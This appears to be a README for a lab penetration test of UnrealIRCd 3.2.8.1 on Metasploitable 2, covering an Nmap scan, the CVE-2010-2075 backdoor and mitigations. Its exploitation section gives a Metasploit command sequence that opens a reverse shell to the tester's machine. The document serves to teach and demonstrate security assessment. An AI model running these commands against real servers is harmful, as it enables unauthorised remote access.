# 🛡️ Penetration Testing of UnrealIRCd 3.2.8.1 on Metasploitable 2

## 📌 Project Overview
Company XYZ, a fast-growing fintech firm, relies on an internal IRC server for developer communications.
This project assesses the security posture of that server, which runs UnrealIRCd 3.2.8.1—a version known 
to contain a backdoor vulnerability.

As a penetration tester, I conducted a controlled assessment to:
- Identify vulnerabilities
- Demonstrate exploitability
- Evaluate business risks
- Recommend mitigation strategies


## 🚨 Executive Summary

### Objectives
- Assess the IRC server's security
- Identify vulnerabilities affecting confidentiality, integrity, or availability
- Evaluate exploitability using reconnaissance and passive scanning
- Recommend mitigation strategies

### Key Findings
- **Outdated Software**: UnrealIRCd 3.2.8.1 confirmed to be vulnerable
- **Confirmed Exploitability**: Verified via Nmap and passive recon tools
- **Risk Level**: High

### Business Risks
- Remote unauthorized access
- Exposure of internal communications
- Potential lateral movement across infrastructure

### Recommended Actions
- Decommission or upgrade the IRC server immediately
- Segment the network to isolate critical assets
- Enhance monitoring and logging


## 🔍 Reconnaissance

### Active Recon (Nmap)
```bash
nmap -sS -sV -T4 --version-light <Target IP>
```
Sample Output:
```
PORT       STATE    SERVICE    VERSION
6667/tcp   open     irc        UnrealIRCd 3.2.8.1
```

### Passive Recon
- Used Rapid7 and Google Dorking to identify CVE-2010-2075
- Discovered public exploit modules and vulnerability documentation


## 🧨 Exploitation

### Metasploit Module
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST <Target IP>
set RPORT 6667
set PAYLOAD cmd/unix/reverse
set LHOST <Kali IP>
set LPORT 4444
exploit
```

### Result
- Successful reverse shell access
- Full command execution without authentication

---

## 🕵️ Post-Exploitation
- Privilege escalation
- Persistence mechanisms
- Data exfiltration
- Network pivoting
- Log tampering

---

## ⚠️ Vulnerability Analysis

- **CVE ID**: CVE-2010-2075  
- **Type**: Remote Command Execution via Backdoor  
- **Impact**: Full unauthenticated shell access

---

## 🧯 Mitigation Recommendations
- Upgrade to the latest version from [unrealircd.org](https://www.unrealircd.org/)
- Verify installation integrity
- Restrict IRC port access (e.g., 6667)
- Enable SSL/TLS
- Monitor with IDS/IPS tools
- Audit user accounts and reset credentials

---

## 👨‍💻 Author
**Adams Samson**  
FCT Abuja, Nigeria


## 📬 Contact

- **Email:** [adamsmona111@gmail.com](mailto:adamsmona111@gmail.com)  
- **LinkedIn:** [linkedin.com/in/adams-samson](https://www.linkedin.com/in/adams-samson)


---

## 📜 License
This project is licensed under the MIT License.
```
